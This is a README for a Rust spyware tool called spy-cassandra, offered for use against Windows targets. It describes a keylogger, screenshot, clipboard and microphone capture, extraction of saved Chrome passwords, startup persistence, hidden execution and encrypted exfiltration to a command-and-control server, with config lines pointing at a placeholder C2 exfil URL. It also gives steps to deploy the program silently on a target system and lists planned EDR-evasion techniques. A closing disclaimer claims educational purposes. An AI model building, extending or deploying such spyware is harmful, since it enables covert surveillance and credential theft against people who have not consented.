# spy-cassandra

A stealthy data collection and exfiltration tool written in Rust for Windows systems.

## Description

spy-cassandra is a comprehensive spyware application that silently collects system information including keystrokes, clipboard contents, screenshots, location data, and microphone audio. All collected data is encrypted and exfiltrated to a command and control (C2) server at regular intervals.

## Features

- **Keylogger**: Captures all keystrokes with timestamps and active window information
- **Clipboard Monitoring**: Tracks clipboard changes every 5 seconds
- **Screenshot Capture**: Takes full desktop screenshots periodically
- **Location Tracking**: Collects GPS coordinates (placeholder implementation)
- **Microphone Recording**: Captures 10 seconds of audio from the default microphone periodically
- **Browser Password Stealing**: Decrypts and extracts saved passwords from Chrome
- **Data Encryption**: AES-256-GCM encryption for all exfiltrated data
- **Persistence**: Automatically adds itself to Windows startup
- **Stealth Mode**: Hides console window and runs silently
- **HTTPS Exfiltration**: Secure data transmission to C2 server
- **Modular Architecture**: Code organized into separate modules for maintainability
- **Configuration**: TOML-based configuration file for easy setup

## Mobile Version (Android)

A mobile version is planned using Rust + Kotlin for Android devices. This will include:

- SMS interception
- Call logging
- GPS tracking
- Camera access
- App data exfiltration

*Note: Mobile version implementation pending*

## Anti-Detection (EDR Bypass 2025)

Advanced techniques to evade modern Endpoint Detection and Response systems:

- Process injection and hollowing
- Memory encryption
- API unhooking
- Signature evasion
- Behavioral camouflage

*Note: Anti-detection features require additional implementation*

## Installation

### Prerequisites

- Rust 1.70 or later
- Windows 10/11

### Build

```bash
cargo build --release
```

## Configuration

Edit `config.toml` to configure the C2 server and encryption:

```toml
[c2]
url = "https://your-c2-domain.com/exfil"
encryption_key = "99999999999999999999999999999999"  # 32 bytes hex
```

## Usage

1. Configure the C2 server URL and encryption key in `src/main.rs`
2. Build the project
3. Deploy the executable to target system
4. The application will run silently and begin data collection

### Configuration

Edit the following constants in `src/main.rs`:

```rust
const C2_URL: &str = "https://your-c2-domain.com/exfil";
const ENCRYPTION_KEY: [u8; 32] = [0x99; 32]; // Change for each build
```

## Dependencies

- `tokio` - Async runtime
- `aes-gcm` - Encryption
- `rdev` - Keyboard input capture
- `clipboard` - Clipboard access
- `screenshots` - Screen capture
- `reqwest` - HTTP client
- `windows` - Windows API bindings
- `cpal` - Audio capture
- `hound` - WAV file encoding
- `base64` - Data encoding
- `chrono` - Timestamps
- `whoami` - System information
- `rusqlite` - SQLite database access
- `toml` - Configuration parsing
- `serde` - Serialization

## Disclaimer

This software is for educational and research purposes only. Unauthorized use of this software to collect data without consent is illegal and unethical. The authors are not responsible for any misuse of this code.

